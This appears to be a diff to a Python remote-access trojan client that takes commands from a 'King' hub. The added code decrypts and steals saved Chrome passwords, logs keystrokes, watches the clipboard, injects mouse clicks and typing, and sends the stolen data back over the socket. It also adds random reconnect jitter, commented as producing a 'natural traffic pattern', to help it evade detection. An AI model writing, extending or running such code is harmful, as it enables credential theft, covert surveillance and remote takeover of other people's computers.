@@ -11,6 +11,7 @@ import ctypes
 import winreg
 import threading
 import subprocess
+import random
 try:
     from mss import mss
     MSS_AVAILABLE = True
@@ -21,6 +22,175 @@ try:
     PIL_AVAILABLE = True
 except ImportError:
     PIL_AVAILABLE = False
+try:
+    import pyautogui
+    PYAUTOGUI_AVAILABLE = True
+except ImportError:
+    pyautogui = None
+    PYAUTOGUI_AVAILABLE = False
+try:
+    from pynput import keyboard
+    PYNPUT_AVAILABLE = True
+except ImportError:
+    keyboard = None
+    PYNPUT_AVAILABLE = False
+try:
+    import pyperclip
+    PYPERCLIP_AVAILABLE = True
+except ImportError:
+    pyperclip = None
+    PYPERCLIP_AVAILABLE = False
+try:
+    import sqlite3
+    SQLITE_AVAILABLE = True
+except ImportError:
+    sqlite3 = None
+    SQLITE_AVAILABLE = False
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Protocol.KDF import PBKDF2
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    AES = None
+    PBKDF2 = None
+    CRYPTO_AVAILABLE = False
+
+# Global variables for keylogger and clipboard
+keylog_active = False
+keylog_data = ""
+keylog_thread = None
+clipboard_thread = None
+clipboard_active = False
+last_clipboard = ""
+
+def extract_chrome_credentials():
+    """Extract and decrypt Chrome saved passwords."""
+    if not SQLITE_AVAILABLE or not CRYPTO_AVAILABLE:
+        return "Required libraries not available: sqlite3 or pycryptodome"
+
+    user_profile = os.getenv('USERPROFILE')
+    chrome_path = os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
+    login_data = os.path.join(chrome_path, 'Login Data')
+    local_state = os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
+
+    if not os.path.exists(login_data) or not os.path.exists(local_state):
+        return "Chrome data files not found"
+
+    # Get master key from Local State
+    with open(local_state, 'r', encoding='utf-8') as f:
+        local_state_data = json.load(f)
+
+    encrypted_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])
+    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
+
+    # Decrypt master key using DPAPI
+    try:
+        master_key = ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(ctypes.c_buffer(encrypted_key)), None, None, None, None, 0, ctypes.byref(ctypes.c_void_p()))
+        master_key = ctypes.string_at(master_key.contents.pbData, master_key.contents.cbData)
+    except:
+        return "Failed to decrypt master key"
+
+    # Connect to Login Data
+    conn = sqlite3.connect(login_data)
+    cursor = conn.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+
+    credentials = []
+    for row in cursor.fetchall():
+        url, username, encrypted_password = row
+        if encrypted_password.startswith(b'v10'):
+            # AES-GCM decryption
+            nonce = encrypted_password[3:15]
+            ciphertext = encrypted_password[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+            try:
+                password = cipher.decrypt(ciphertext)[:-16].decode('utf-8')  # Remove auth tag
+                credentials.append(f"URL: {url}\nUsername: {username}\nPassword: {password}\n---\n")
+            except:
+                pass
+
+    conn.close()
+    return "\n".join(credentials) if credentials else "No credentials found"
+
+def start_keylogger():
+    """Start the keylogger thread."""
+    global keylog_active, keylog_thread
+    if not PYNPUT_AVAILABLE:
+        return "pynput not available"
+
+    if keylog_active:
+        return "Keylogger already active"
+
+    keylog_active = True
+    keylog_data = ""
+
+    def on_press(key):
+        global keylog_data
+        try:
+            keylog_data += key.char
+        except AttributeError:
+            if key == keyboard.Key.space:
+                keylog_data += " "
+            elif key == keyboard.Key.enter:
+                keylog_data += "\n"
+            elif key == keyboard.Key.tab:
+                keylog_data += "\t"
+            else:
+                keylog_data += f"[{key}]"
+
+    listener = keyboard.Listener(on_press=on_press)
+    keylog_thread = threading.Thread(target=listener.start, daemon=True)
+    keylog_thread.start()
+    return "Keylogger started"
+
+def stop_keylogger():
+    """Stop the keylogger."""
+    global keylog_active
+    keylog_active = False
+    if keylog_thread:
+        keylog_thread.join(timeout=1.0)
+    return "Keylogger stopped"
+
+def get_keylog():
+    """Get the current keylog data."""
+    return keylog_data
+
+def start_clipboard_monitor():
+    """Start clipboard monitoring thread."""
+    global clipboard_active, clipboard_thread, last_clipboard
+    if not PYPERCLIP_AVAILABLE:
+        return "pyperclip not available"
+
+    if clipboard_active:
+        return "Clipboard monitor already active"
+
+    clipboard_active = True
+    last_clipboard = pyperclip.paste() if pyperclip else ""
+
+    def monitor_clipboard():
+        global last_clipboard
+        while clipboard_active:
+            try:
+                current = pyperclip.paste()
+                if current != last_clipboard:
+                    last_clipboard = current
+                    # Send to hub if connected, but for now, just log
+                    print(f"[*] Clipboard changed: {current[:100]}...")
+            except:
+                pass
+            time.sleep(1)
+
+    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
+    clipboard_thread.start()
+    return "Clipboard monitor started"
+
+def stop_clipboard_monitor():
+    """Stop clipboard monitoring."""
+    global clipboard_active
+    clipboard_active = False
+    if clipboard_thread:
+        clipboard_thread.join(timeout=1.0)
+    return "Clipboard monitor stopped"
 
 def capture_desktop_screenshot(client: socket.socket) -> None:
     """Capture primary monitor and send as PNG byte stream to server."""
@@ -255,7 +425,6 @@ def _print_node_banner(hub_ip: str, port: int) -> None:
 
 
 def connect_to_hub(hub_ip: str, port: int) -> None:
-    delay = 5  # Start with 5 seconds to allow Wi-Fi to connect after reboot
     while True:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.settimeout(10.0)
@@ -264,7 +433,6 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
             print(f"[*] Attempting to reach King at {hub_ip}...")
             client.connect((hub_ip, port))
             print(f"[*] SUCCESS: Connected to Command Hub.")
-            delay = 1 # Reset delay after successful connection
 
             while True:
                 try:
@@ -379,6 +547,62 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                             client.sendall(json_report.encode())
                         except Exception as e:
                             print(f"[-] HARVEST_USER failed: {e}")
+                    elif command == 'EXTRACT_CREDENTIALS':
+                        try:
+                            creds = extract_chrome_credentials()
+                            client.send(f"CRED_SIZE {len(creds)}\n".encode())
+                            client.sendall(creds.encode())
+                        except Exception as e:
+                            error_msg = f"Failed to extract credentials: {e}"
+                            client.send(f"CRED_SIZE {len(error_msg)}\n".encode())
+                            client.sendall(error_msg.encode())
+                    elif command == 'KEYLOG':
+                        if 'START' in command.upper():
+                            result = start_keylogger()
+                        elif 'STOP' in command.upper():
+                            result = stop_keylogger()
+                        else:
+                            result = "Use KEYLOG START or KEYLOG STOP"
+                        client.sendall(f"KEYLOG_RESULT: {result}\n".encode())
+                    elif command == 'GET_KEYS':
+                        try:
+                            log_data = get_keylog()
+                            client.send(f"KEYLOG_SIZE {len(log_data)}\n".encode())
+                            client.sendall(log_data.encode())
+                        except Exception as e:
+                            error_msg = f"Failed to get keylog: {e}"
+                            client.send(f"KEYLOG_SIZE {len(error_msg)}\n".encode())
+                            client.sendall(error_msg.encode())
+                    elif command == 'CLIPBOARD':
+                        if 'START' in command.upper():
+                            result = start_clipboard_monitor()
+                        elif 'STOP' in command.upper():
+                            result = stop_clipboard_monitor()
+                        else:
+                            result = "Use CLIPBOARD START or CLIPBOARD STOP"
+                        client.sendall(f"CLIPBOARD_RESULT: {result}\n".encode())
+                    elif command.startswith('CLICK '):
+                        if not PYAUTOGUI_AVAILABLE:
+                            print("[!] pyautogui not available")
+                            continue
+                        try:
+                            parts = command.split()
+                            x = int(parts[1])
+                            y = int(parts[2])
+                            pyautogui.click(x, y)
+                            print(f"[+] Clicked at ({x}, {y})")
+                        except (ValueError, IndexError, Exception) as e:
+                            print(f"[!] Invalid CLICK command or failed: {e}")
+                    elif command.startswith('TYPE '):
+                        if not PYAUTOGUI_AVAILABLE:
+                            print("[!] pyautogui not available")
+                            continue
+                        try:
+                            text = command[5:].strip('"')
+                            pyautogui.typewrite(text)
+                            print(f"[+] Typed: {text}")
+                        except Exception as e:
+                            print(f"[!] Failed to type: {e}")
                     else:
                         print(f'[?] Received: {command}')
         
@@ -394,10 +618,10 @@ def connect_to_hub(hub_ip: str, port: int) -> None:
                 pass
             client.close()
 
+        delay = random.randint(5, 15)  # Jitter for natural traffic pattern
         print(f'[*] Retrying in {delay} seconds...')
         time.sleep(delay)
-        # Exponential backoff: waits longer each time it fails, up to 30s
-        delay = min(delay + 5, 30)
+        # Jitter: random delay between 5-15 seconds for natural traffic
 
 def parse_args():
     parser = argparse.ArgumentParser(description='Node client for connecting to the King command hub')
